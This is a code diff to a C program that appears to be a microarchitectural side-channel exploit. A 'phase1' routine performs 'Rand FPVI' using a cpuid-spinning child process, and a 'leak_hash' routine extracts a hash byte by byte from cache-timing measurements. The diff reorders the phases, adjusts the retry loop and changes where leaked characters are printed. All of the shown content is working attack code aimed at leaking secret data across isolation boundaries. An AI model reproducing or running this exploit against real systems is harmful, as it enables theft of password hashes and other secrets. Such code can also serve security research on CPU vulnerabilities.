@@ -310,8 +310,9 @@ int phase1(unsigned char *leak, unsigned char *timing_buff, int amount_to_read, 
         return sched_setaffinity(0, sizeof(set), &set);
         while (1) {
             asm volatile("movabs $0x80000002, %%rax\ncpuid\n":::"rax","ebx","ecx","edx");
-            // usleep(1000);
+            usleep(1000);
         }
+        _exit(0);
     }
     if (pid < 0) return -1;
 
@@ -366,7 +367,6 @@ int phase1(unsigned char *leak, unsigned char *timing_buff, int amount_to_read, 
     memcpy(prefix+sizeof(double), &prefix_b, sizeof(double));
 
     printf("\n |=> %016" PRIx64 "%016" PRIx64 "\n", prefix_a, prefix_b);
-    printf("\n |=> %s\n", prefix);
     kill(pid, SIGKILL); // Clean up child process
     return 0;
 }
@@ -407,26 +407,26 @@ int leak_hash(unsigned char *leak, unsigned char *timing_buff){
     int initial = 7, c = 7;
     uint64_t mask;
 
-    printf("[=] Leaking Hash:\n |> %s", leaked);
+    fprintf(stderr, "[=] Leaking Hash:\n |> %s", leaked);
     uint64_t sp = GetTimeStamp();
 
     int count_waiting = 0;
     int retried = 0;
-    while(c<40){
-        if (count_waiting>MAX_WAITING_BEFORE_RETRY && !retried) {c-=2; retried=1;}
+    while(c<39){
+        // if (count_waiting>MAX_WAITING_BEFORE_RETRY && !retried) {c-=2; retried=1;}
         i = c-initial+1;
         mask = *((uint64_t *)&leaked[i]) & 0xffffffffffff;
         leaked[c] = collect_value_masked(i, STRIDE, 100, leak, timing_buff, mask);
         if (!is_hash_char(leaked[c])) {
             count_waiting+=1; continue;
         }
-        // putchar(leaked[c]);
-        printf("%c\n", leaked[c]);
+        fprintf(stderr, "%c", leaked[c]);
+
         c++;
         retried = 0;
     }
 
-    printf(" |=> As String: %s\n", leaked);
+    printf("\n |=> As String: %s\n", leaked);
 
     uint64_t se = GetTimeStamp();
     printf(" |= Took %ld s\n", (se-sp)/1000000);
@@ -445,11 +445,9 @@ int main(){
         _exit(1);
     }
 
-    uint64_t sp = GetTimeStamp();
-
+    // Phase 1: Rand FPVI
+    phase1(leak, timing_buff, RDRAND_ITERS, 3);
+    
     // // Phase 2: Hash Leak
     leak_hash(leak, timing_buff);
-
-    // Phase 1: Rand FPVI
-    phase1(leak, timing_buff, RDRAND_ITERS, 1);
 }
